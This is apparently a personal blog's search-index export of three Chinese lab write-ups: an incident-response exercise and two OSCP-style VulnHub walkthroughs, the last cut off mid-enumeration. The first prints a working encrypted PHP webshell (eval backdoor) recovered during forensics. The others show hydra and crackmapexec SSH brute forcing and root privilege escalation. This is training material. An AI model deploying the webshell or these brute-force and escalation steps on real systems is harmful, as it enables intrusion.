<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>应急响应靶场-zgsf-web1</title>
      <link href="/2024/08/06/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-zgsf-web1/"/>
      <url>/2024/08/06/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-zgsf-web1/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://blog.csdn.net/qq_61872115/article/details/136618102">https://blog.csdn.net/qq_61872115/article/details/136618102</a></p><h1 id="前景需要："><a href="#前景需要：" class="headerlink" title="前景需要："></a>前景需要：</h1><p>小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，这是他的服务器系统，请你找出以下内容，并作为通关条件：</p><p>1.攻击者的shell密码<br>2.攻击者的IP地址<br>3.攻击者的隐藏账户名称<br>4.攻击者挖矿程序的矿池域名</p><p>用户：<br>administrator<br>密码<br><a href="mailto:&#90;&#103;&#115;&#x66;&#64;&#97;&#x64;&#109;&#105;&#110;&#46;&#x63;&#x6f;&#109;">&#90;&#103;&#115;&#x66;&#64;&#97;&#x64;&#109;&#105;&#110;&#46;&#x63;&#x6f;&#109;</a></p><h1 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h1><p>登陆主机，启动小皮</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806124005693.png" alt="image-20240806124005693"></p><p>访问网站</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806124456124.png" alt="image-20240806124456124"></p><p>找到网站根目录，直接查杀一下是否存在后门文件，我这里用的是D盾</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806125049731.png" alt="image-20240806125049731"></p><p>查看文件内容，不是这个。。。用火绒把，也没有</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806132945478.png" alt="image-20240806132945478"></p><p>我说呢，被windows defender给隔离了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806133037186.png" alt="image-20240806133037186"></p><p>打开看看</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line"><span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到密码rebeyond</p><h1 id="网站日志排查"><a href="#网站日志排查" class="headerlink" title="网站日志排查"></a>网站日志排查</h1><p>查看apache日志，在小皮的扩展里找到日志</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806133324756.png" alt="image-20240806133324756"></p><p>发现ip：192.168.126.1一直访问呢shell文件</p><p>然后对于这个地址我们可以访问一下就知道，他是在暴力破解账户密码</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806133641734.png" alt="image-20240806133641734"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806133705685.png" alt="image-20240806133705685"></p><p>查看后续日志可发现它破解成功了，很可能是存在弱口令</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806133910009.png" alt="image-20240806133910009"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806133817603.png" alt="image-20240806133817603"></p><p>并且在后台访问&#x2F;content&#x2F;plugins&#x2F;tips&#x2F;目录，成功将shell.php后门传上去了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806133947496.png" alt="image-20240806133947496"></p><h1 id="隐藏账户"><a href="#隐藏账户" class="headerlink" title="隐藏账户"></a>隐藏账户</h1><p>多种方法，控制面板或注册表</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806134039485.png" alt="image-20240806134039485"></p><p>注册表这边我没有找到，试试日志分析，查看登陆成功的日志，先在事件查看器例保存Security日志，再用logparser分析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LogParser.exe -i:EVT -oDATAGRID &quot;SELECT * FROM Security.evtx WHERE EventID=4625&quot;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806135325167.png" alt="image-20240806135325167"></p><h1 id="挖矿程序"><a href="#挖矿程序" class="headerlink" title="挖矿程序"></a>挖矿程序</h1><p>先在寻找挖矿程序，并找到它的外联域名信息</p><p>找到用户文件夹下的hack168下的桌面文件，发现程序信息先在寻找挖矿程序，</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806135435899.png" alt="image-20240806135435899"></p><p>反编译</p><p>列举用到的工具：</p><p>pyinstxtractor反编译工具：<a href="%5BPython38%5D(C:%5CUsers%5Cyxz%5CAppData%5CLocal%5CPrograms%5CPython%5CPython38)">GitHub - extremecoders-re&#x2F;pyinstxtractor: PyInstaller Extractor</a></p><p>pyc反编译工具：<a href="https://v2.toolkk.com/tools/pyc-decomplie">pyc反编译 - 工具匠</a></p><p>在线的刚好在维护.要换一个</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806142135137.png" alt="image-20240806142135137"></p><p>成功反编译，在文件中找到Kuang.pyc</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806142201334.png" alt="image-20240806142201334"></p><p>在线反编译</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806142230129.png" alt="image-20240806142230129"></p><p>最终得到矿池域名：wakuang.zhigongshanfang.top</p><h1 id="提交结果"><a href="#提交结果" class="headerlink" title="提交结果"></a>提交结果</h1><p>提交到最后一个时，会直接结束</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240806142356735.png" alt="image-20240806142356735"></p><p>反编译看看结果</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;公众号：知攻善防实验室&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;欢迎使用知攻善防实验室-应急响应训练靶机解题系统&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;在此之前，您应该获取到以下信息&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1.攻击者的shell密码&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2.攻击者的IP地址&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3.攻击者的隐藏账户名称&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;4.攻击者挖矿程序的矿池域名&#x27;</span>)</span><br><span class="line">num = <span class="built_in">input</span>(<span class="string">&#x27;你准备好了吗？（y or n）&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> num == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    shellpass = <span class="built_in">input</span>(<span class="string">&#x27;请输入攻击者的shell密码:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> shellpass == <span class="string">&#x27;rebeyond&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;题解正确！&#x27;</span>)</span><br><span class="line">        IPadd = <span class="built_in">input</span>(<span class="string">&#x27;请输入攻击者的IP地址&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> IPadd == <span class="string">&#x27;192.168.126.1&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;题解正确！&#x27;</span>)</span><br><span class="line">            username = <span class="built_in">input</span>(<span class="string">&#x27;请输入攻击者的隐藏账户名称:&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> username == <span class="string">&#x27;hack168&#x27;</span> <span class="keyword">or</span> username == <span class="string">&#x27;hack168$&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;题解正确！&#x27;</span>)</span><br><span class="line">                wakuang = <span class="built_in">input</span>(<span class="string">&#x27;请输入攻击者挖矿程序的矿池域名:&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> wakuang == <span class="string">&#x27;wakuang.zhigongshanfang.top&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;题解正确！&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;恭喜您，该靶机已被您攻破！&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;恭喜您，该靶机已被您攻破！&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;恭喜您，该靶机已被您攻破！&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;恭喜您，该靶机已被您攻破！&#x27;</span>)</span><br></pre></td></tr></table></figure><p>没错滴</p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-005-Broken</title>
      <link href="/2024/08/04/OSCP-005-Broken/"/>
      <url>/2024/08/04/OSCP-005-Broken/</url>
      
        <content type="html"><![CDATA[<h1 id="Broken-Gallery"><a href="#Broken-Gallery" class="headerlink" title="Broken Gallery"></a>Broken Gallery</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.174.0/24</span><br></pre></td></tr></table></figure><p>获得目标ip：192.168.174.176</p><h2 id="端口，服务扫描"><a href="#端口，服务扫描" class="headerlink" title="端口，服务扫描"></a>端口，服务扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.174.176</span><br></pre></td></tr></table></figure><p>得到22和80端口开放</p><p>下面还有另一种方法，首先通过namp生成扫描结果的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sT -p- --min-rate 1000 192.168.174.167 -oA ./Broken_galley</span><br></pre></td></tr></table></figure><p>生成报告后，用awk去找，算是练习把</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat Broken_galley.nmap | grep &quot;open&quot; | awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27; </span><br><span class="line">返回22，80</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sT -sC -sV -p 22,80 192.168.174.176 -oA ./detail</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805195444643.png" alt="image-20240805195444643"></p><p>这种带目录的扫描比较好看</p><h2 id="访问服务"><a href="#访问服务" class="headerlink" title="访问服务"></a>访问服务</h2><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240804170115370.png" alt="image-20240804170115370"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240804170124532.png" alt="image-20240804170124532"></p><p>有一些图片，和一个readme文件，下载下来是一串16进制的字节码</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240804174129642.png" alt="image-20240804174129642"></p><p>通过xxd还原成二进制文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxd -r -ps README.md &gt; README.bin</span><br></pre></td></tr></table></figure><ul><li>-r选项用于将十六进制格式转换回二进制格式</li><li>-p表示输出纯粹的十六进制编码，而不包括其他信息</li><li>-s选项用于跳过文件的前N个字节</li></ul><p>通过strings来读二进制文件，通过head来读取前几行内容来确定文件类型</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings README.bin | head -n 10</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805221742308.png" alt="image-20240805221742308"></p><p>可以看到jfif头，说明这个文件是图片文件，更改为jpg后缀并打开</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv README.bin README.jpg</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805221943926.png" alt="image-20240805221943926"></p><p>应用程序是坏的的，基础设施是坏的。。。没什么思路</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.174.167</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240804174231876.png" alt="image-20240804174231876"></p><p>没什么收获，估计要从图片出发，这里也提供另一种方法</p><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -u http://192.168.10.111/ -x txt,rar,zip,tar,sql,php</span><br></pre></td></tr></table></figure><p>内容会更全一点，但在这里也没什么返回，后台挂着，gobuster还可以扫别的内容</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805195959568.png" alt="image-20240805195959568"></p><h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xdg-open  img_forest.jpg 查看图片的命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings *.jpg | less</span><br></pre></td></tr></table></figure><p>没什么内容</p><p>再用exiftool来看看其他图片，没有发现有隐藏的信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exiftool *.jpg</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805222700803.png" alt="image-20240805222700803"></p><p>也有另一种方法看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steghide extract -sf img_5terre.jpg</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805222810915.png" alt="image-20240805222810915"></p><p>也没什么内容，只能从爆破ssh去测试了</p><h2 id="爆破SSH"><a href="#爆破SSH" class="headerlink" title="爆破SSH"></a>爆破SSH</h2><p>看看文件名有啥提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls | grep .jpg | sed s/\.jpg//</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805222931750.png" alt="image-20240805222931750"></p><p>推测应该是密码或用户名,用这个来生成一个wordlist</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls | grep .jpg | sed s/\.jpg// &gt; wordlist</span><br></pre></td></tr></table></figure><p>接下来用hydra爆破测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L wordlist -P wordlist 192.168.174.176 ssh</span><br></pre></td></tr></table></figure><p>失败，去掉前缀试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat wordlist | sed s/img_// &gt; wordlist2</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805223326918.png" alt="image-20240805223326918"></p><p>再把broken和galley加上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -e &quot;broken\ngalley&quot; &gt;&gt; wordlist2</span><br></pre></td></tr></table></figure><p>然后利用rsmangler工具，它首先将对所述输入字和生成的所有排列和字样的缩写（为了它们出现在文件中）完成的各种操作之前它适用的其余部分</p><p><a href="https://zing.gitbooks.io/kali-lunix/content/09x/9x29_RSMangler.html">https://zing.gitbooks.io/kali-lunix/content/09x/9x29_RSMangler.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsmangler -m 6 -x 8 -r -d -e -i --punctuation -y -a -C --pna --nb --space --allow-duplicates -f wordlist2 -o mangled</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805223812412.png" alt="image-20240805223812412"></p><p>然后进行爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L wordlist2 -P mangled 192.168.174.176 ssh</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805224445315.png" alt="image-20240805224445315"></p><p>也可以从另一种思路出发，根据图片手动生成字典</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5terre</span><br><span class="line">forest</span><br><span class="line">lights</span><br><span class="line">mountains</span><br><span class="line">Bob</span><br><span class="line">BROKEN</span><br><span class="line">broken</span><br><span class="line">avrahamacohen.ac@gmail.com</span><br><span class="line">avrahamcohen.ac</span><br><span class="line">avrahamcohen</span><br></pre></td></tr></table></figure><p>通过crackmapexec进行SSH爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#--continue-on-success:表示成功获得凭据后继续爆破</span><br><span class="line">#跟john相比，john更偏向快速，creackmapexec支持的协议和功能比较多</span><br><span class="line"></span><br><span class="line">sudo crackmapexec ssh 192.168.10.111 -u creds -p creds --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805224630599.png" alt="image-20240805224630599"></p><p>获得账号密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">broken:broken</span><br></pre></td></tr></table></figure><p>登陆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh broken@192.168.174.176</span><br></pre></td></tr></table></figure><p>查看可以用户环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805224641938.png" alt="image-20240805224641938"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先查看历史命令，看看线索</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805224742187.png" alt="image-20240805224742187"></p><p>发现有个密码策略文件，尝试寻找一下这个文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lah</span><br><span class="line">cat .sudo_as_admin_successful</span><br><span class="line">locate password-policy.sh</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805225010573.png" alt="image-20240805225010573"></p><p>得到路径&#x2F;etc&#x2F;init.d&#x2F;pasword-policy.sh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/init.d/password-policy.sh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">DAYOFWEEK=$(date +&quot;%u&quot;)</span><br><span class="line">echo DAYOFWEEK: $DAYOFWEEK</span><br><span class="line"></span><br><span class="line">if [ &quot;$DAYOFWEEK&quot; -eq 4 ]</span><br><span class="line">then</span><br><span class="line">        sudo sh -c &#x27;echo root:TodayIsAgoodDay | chpasswd&#x27;</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$DAYOFWEEK</span>&quot;</span> == 4 ]</span></span><br></pre></td></tr></table></figure><p>这段脚本是一个简单的 Bash 脚本，用于检查当前是星期几，并在星期四时更改 root 用户的密码。下面是脚本的逐行解释：</p><ol><li><code>#!/bin/bash</code>：这是一个 shebang 行，告诉系统这个脚本应该使用哪个解释器来执行，这里是 Bash。</li><li><code>DAYOFWEEK=$(date +&quot;%u&quot;)</code>：这行命令使用 <code>date</code> 命令获取当前的星期数（星期一为 1，星期日为 7），并将其存储在变量 <code>DAYOFWEEK</code> 中。</li><li><code>echo DAYOFWEEK: $DAYOFWEEK</code>：这行打印出当前的星期数。</li><li><code>if [ &quot;$DAYOFWEEK&quot; -eq 4 ]</code>：这是一个条件语句，检查 <code>DAYOFWEEK</code> 是否等于 4（星期四）。</li><li><code>then</code>：如果条件为真（即当前是星期四），则执行下面的命令。</li><li><code>sudo sh -c &#39;echo root:TodayIsAgoodDay | chpasswd&#39;</code>：这行命令使用 <code>sudo</code> 以超级用户权限执行 <code>sh -c</code>，然后通过管道将 <code>echo</code> 命令的输出传递给 <code>chpasswd</code> 命令，从而更改 root 用户的密码为 “TodayIsAgoodDay”。</li><li><code>fi</code>：结束 if 语句。</li></ol><p>注释掉的 <code>#if [ &quot;$DAYOFWEEK&quot; == 4 ]</code> 行是另一种写法，使用 <code>==</code> 进行字符串比较，但由于 <code>DAYOFWEEK</code> 是一个数字，所以应该使用 <code>-eq</code> 来进行数值比较。</p><p>为了测试，我们改成周一的版本,我们先通过下面的方法改一下脚本，再来reboot</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date +&quot;%u&quot;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805230412615.png" alt="image-20240805230412615"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/init.d/password-policy.sh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">DAYOFWEEK=$(date +&quot;%u&quot;)</span><br><span class="line">echo DAYOFWEEK: $DAYOFWEEK</span><br><span class="line"></span><br><span class="line">if [ &quot;$DAYOFWEEK&quot; -eq 1 ]</span><br><span class="line">then</span><br><span class="line">        sudo sh -c &#x27;echo root:TodayIsAgoodDay | chpasswd&#x27;</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$DAYOFWEEK</span>&quot;</span> == 4 ]</span> </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805230552620.png" alt="image-20240805230552620"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.174.176</span><br></pre></td></tr></table></figure><p>记得用broken连上再su root</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805230751633.png" alt="image-20240805230751633"></p><h2 id="timedatectl提权"><a href="#timedatectl提权" class="headerlink" title="timedatectl提权"></a>timedatectl提权</h2><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805225707696.png" alt="image-20240805225707696"></p><p>前面我们看到broken用户还可以执行timedatectl命令</p><p>通过gtfobins：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 来查看对应的提权方法</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805225855524.png" alt="image-20240805225855524"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo timedatectl list-timezones</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240805230037506.png" alt="image-20240805230037506"></p>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-004-Matrix</title>
      <link href="/2024/08/01/OSCP-004-Matrix/"/>
      <url>/2024/08/01/OSCP-004-Matrix/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP-004-Matrix"><a href="#OSCP-004-Matrix" class="headerlink" title="OSCP-004-Matrix"></a>OSCP-004-Matrix</h1><p>调整为nat模式</p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.174.0/24</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240801202833123.png" alt="image-20240801202833123"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- -T5 192.168.174.161</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240801202919969.png" alt="image-20240801202919969"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p80,6464,7331 -sV --script &quot;default, safe&quot; (IP)</span><br></pre></td></tr></table></figure><p>可以获得的信息<br>80和7331都是python起的http服务</p><p>6464是一个ssh的端口</p><h2 id="访问服务"><a href="#访问服务" class="headerlink" title="访问服务"></a>访问服务</h2><p>80端口</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240801203406539.png" alt="image-20240801203406539"></p><p>7331端口：一个登陆界面</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240801203544739.png" alt="image-20240801203544739"></p><p>输入admin:admin后，有个显示，传入后台应该是base64</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;YWRtaW46YWRtaW4=&quot; | base64 -d</span><br></pre></td></tr></table></figure><p>admin:admin</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.174.161</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802094342918.png" alt="image-20240802094342918"></p><p>访问该目录</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802094413249.png" alt="image-20240802094413249"></p><p>可以在img里找到一个rabbit的图片</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802094440273.png" alt="image-20240802094440273"></p><p>下载下来试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.174.161/assets/img/Matrix_can-show-you-the-door.png</span><br></pre></td></tr></table></figure><p>官方文档是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings xx.png</span><br><span class="line">zsteg -a xx.png</span><br></pre></td></tr></table></figure><p>用这两个命令看下图片有没有隐写信息，没什么收获</p><p>可以发现图片名提示Matrix提供这个门，尝试访问Matrix目录</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802185608055.png" 